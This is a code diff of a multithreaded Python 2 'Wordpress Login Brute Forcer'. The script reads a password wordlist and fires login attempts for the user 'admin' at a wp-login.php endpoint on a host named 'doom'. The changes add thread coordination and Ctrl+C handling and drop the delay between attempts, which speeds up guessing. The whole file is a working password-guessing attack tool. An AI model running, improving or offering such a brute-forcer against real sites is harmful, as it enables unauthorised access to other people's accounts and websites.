@@ -1,45 +1,60 @@
 #!/usr/bin/env python
 
-import time
 from threading import Thread
+from Queue import Queue
 import requests
 import itertools
-import re
-import sys
 import argparse
+import re
 
+import time
+import signal
+import sys
 
-def check_pass(passwords, threadNum, timing):
+def check_pass(passwords, threadNum, timing, q):
 	user = "admin"
 	regex = ur"<strong>ERROR</strong>"
 	url="http://doom:8000/wp-login.php"
-	global MATCH
+	global RUNNING
+	RUNNING = True
 
-	MATCH = False
+	### print "Worker %d: trying %d passwords" % (threadNum, len(passwords))
 	for i in range(len(passwords)):
+
 		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
-		#print "%d Trying: admin/%s" % (threadNum,passwords[i])
 		r = requests.post(url,data=payload)
-		match = re.search(regex,r.text)
-		if match:
-			#print "NO MATCH"
-			pass
-		else:
+		# FIXME check error codes from request.
+
+		if re.search(regex,r.text) == None:
+			# No match found, password worked! Tell the others!
 			print "Worker %d found a password: %s" % (threadNum, passwords[i])
-			MATCH=True
+			RUNNING = False
+		else:
+			# Match found. Password was wrong.
+			#print "No match."
+			pass
+
+		# Match was found, lets shut this circus down!
+		if RUNNING == False:
 			return
 
-		if (MATCH == True):
-			return
+		#time.sleep(1)
+	### print "Worker %d done." % (threadNum)
 
-		time.sleep(timing)
-	print "Worker #%d finished." % (threadNum)
-
+def shutdown(signal, frame):
+	print "Shutting down threads.."
+	sys.exit(0)
 
 def main(argv):
 	THREADS = 20
 	PASSWORDS = ""
 	TIMING = 0
+
+	# setup Queue
+	q = Queue()
+
+	# Setup signal handling
+	signal.signal(signal.SIGINT, shutdown)
 
 	# command line arguments
 	parser = argparse.ArgumentParser(description="Wordpress Login Brute Forcer")
@@ -49,14 +64,13 @@ def main(argv):
 
 	results = parser.parse_args()
 	if (results.password_file):
-		print "Using password file %s" % (results.password_file[0])
+		#print "Using password file %s" % (results.password_file[0])
 		PASSWORDS = results.password_file[0]
 	else:
 		print "No password file.."
 		sys.exit(-1)
 
 	if (results.threads):
-		print "Setting up %d workers" % (results.threads[0])
 		THREADS = results.threads[0]
 	else:
 		print "Using default 20 workers.."
@@ -67,6 +81,7 @@ def main(argv):
 
 	# how many lines are we dealing with?
 	num_lines = sum(1 for line in open(PASSWORDS))
+	print "Using password file %s with %d lines." % (PASSWORDS, num_lines)
 	# double open? FIXME
 	text_file = open(PASSWORDS,'r')
 	# sane array
@@ -84,10 +99,10 @@ def main(argv):
 	print "Using average size of %d passwords/worker" % (len(password_lines[0]))
 
 	# Fire off worker threads with each chunk.
-	print "Starting Workers..."
+	print "Starting %d Workers.. press Ctrl+C to stop." % (THREADS)
 	for worker_number in range(len(password_lines)):
 		# send to thread
-		t = Thread(target=check_pass, args=(password_lines[worker_number],worker_number,TIMING,))
+		t = Thread(target=check_pass, args=(password_lines[worker_number],worker_number,TIMING,q))
 		t.start()
 
 if __name__ == "__main__":
